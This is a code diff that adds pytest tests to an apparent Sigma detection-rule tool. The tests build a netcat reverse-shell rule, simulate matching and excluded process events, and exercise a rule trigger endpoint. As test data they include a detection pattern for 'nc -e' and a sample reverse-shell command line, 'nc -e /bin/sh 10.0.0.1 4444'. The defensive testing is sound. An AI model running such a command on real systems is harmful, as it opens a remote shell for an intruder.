@@ -172,3 +172,95 @@ detection:
     assert "Bundle Rule Alpha" in exported_text
     assert "Bundle Rule Beta" in exported_text
     assert "---" in exported_text
+
+
+def test_visual_builder_to_yaml_and_simulation(client):
+    # 1. Convert visual form to YAML
+    form_data = {
+        "title": "Visual Builder Netcat Reverse Shell",
+        "level": "critical",
+        "platform": "linux",
+        "category": "process_creation",
+        "mitre_tactics": ["execution"],
+        "mitre_techniques": ["T1059"],
+        "criteria": [
+            {
+                "field": "CommandLine",
+                "modifier": "contains",
+                "values": ["nc -e", "netcat -e"],
+            }
+        ],
+        "exclusions": [
+            {
+                "field": "CommandLine",
+                "modifier": "contains",
+                "values": ["benign_test_skip"],
+            }
+        ]
+    }
+    resp = client.post("/rules/visual-to-yaml", json=form_data)
+    assert resp.status_code == 200
+    yaml_str = resp.json()["sigma_yaml"]
+    assert "Visual Builder Netcat Reverse Shell" in yaml_str
+    assert "nc -e" in yaml_str
+    assert "benign_test_skip" in yaml_str
+    assert "condition: selection and not filter" in yaml_str
+
+    # 2. Simulate matching event
+    matching_event = {
+        "event_type": "process_create",
+        "process_name": "nc",
+        "command_line": "nc -e /bin/sh 10.0.0.1 4444",
+        "pid": 5544,
+        "platform": "linux"
+    }
+    sim_resp = client.post("/rules/simulate", json={"sigma_yaml": yaml_str, "event": matching_event})
+    assert sim_resp.status_code == 200
+    sim_data = sim_resp.json()
+    assert sim_data["matched"] is True
+    assert sim_data["severity"] == "malicious"
+    assert sim_data["simulated_alert"] is not None
+    assert sim_data["simulated_alert"]["mitre_technique"] == "T1059"
+
+    # 3. Simulate excluded event (should NOT match)
+    excluded_event = {
+        "event_type": "process_create",
+        "process_name": "nc",
+        "command_line": "nc -e /bin/sh 10.0.0.1 4444 benign_test_skip",
+        "pid": 5545,
+        "platform": "linux"
+    }
+    sim_resp = client.post("/rules/simulate", json={"sigma_yaml": yaml_str, "event": excluded_event})
+    assert sim_resp.status_code == 200
+    assert sim_resp.json()["matched"] is False
+
+
+def test_rule_live_test_trigger(client):
+    yaml_rule = """title: Live Trigger Demo Rule
+id: e2b08fa1-trigger-demo-0001
+status: experimental
+level: high
+tags:
+  - attack.execution
+  - attack.t1059
+detection:
+  selection:
+    CommandLine|contains:
+      - 'simulated_live_trigger_probe'
+  condition: selection
+"""
+    test_event = {
+        "event_type": "process_create",
+        "process_name": "bash",
+        "command_line": "bash -c simulated_live_trigger_probe",
+        "pid": 9911,
+        "platform": "linux"
+    }
+    resp = client.post("/rules/test-trigger", json={"sigma_yaml": yaml_rule, "event": test_event})
+    assert resp.status_code == 200
+    data = resp.json()
+    assert data["status"] == "triggered"
+    assert data["alerts_count"] >= 1
+    assert data["alert"]["rule_name"] == "Live Trigger Demo Rule"
+    assert "findings" in data["findings_url"]
+
